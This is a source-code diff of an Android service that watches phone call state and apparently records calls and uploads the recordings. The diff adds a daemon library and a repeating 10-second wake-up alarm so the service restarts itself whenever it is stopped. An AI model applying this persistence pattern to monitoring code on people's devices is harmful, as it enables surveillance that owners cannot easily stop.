@@ -1,6 +1,10 @@
 package com.underconverbg.detectophone;
 
+import android.app.ActivityManager;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.app.Service;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
@@ -10,8 +14,11 @@ import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
 
+import com.coolerfall.daemon.Daemon;
 import com.underconverbg.detectophone.system.SystemSet;
 import com.underconverbg.detectophone.upload.UploadTools;
+
+import java.util.Calendar;
 
 /**
  * Created by user on 2017/3/2.
@@ -28,6 +35,7 @@ public class PhoneCallStateService extends Service
     public void onCreate()
     {
         super.onCreate();
+        Daemon.run(this, PhoneCallStateService.class, Daemon.INTERVAL_ONE_MINUTE * 2);
 
         Log.e("Service", "onCreate...");
         SystemSet.getIntance().init(this.getApplicationContext());
@@ -35,6 +43,8 @@ public class PhoneCallStateService extends Service
         Log.e("Service", "onStartCommand...");
         UploadTools.createUploadThreadAndStart();
         doInThread();
+
+        again();
     }
 
     public void doInThread()
@@ -87,4 +97,26 @@ public class PhoneCallStateService extends Service
         Log.e("Recorder", "已关闭电话监听服务");
     }
 
+    private void again()
+    {
+        Intent intent = new Intent(this,
+                Receiver1.class);
+        intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
+        intent.setAction("Action.Alarm1");
+
+
+        PendingIntent sender = PendingIntent.getBroadcast(
+                this, 0, intent, 0);
+
+        // We want the alarm to go off 10 seconds from now.
+        Calendar calendar = Calendar.getInstance();
+        calendar.setTimeInMillis(System.currentTimeMillis());
+        calendar.add(Calendar.SECOND, 10);
+        // Schedule the alarm!
+
+        //定时器
+        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        am.setRepeating(AlarmManager.RTC_WAKEUP,
+                System.currentTimeMillis(), 10 * 1000, sender);
+    }
 }
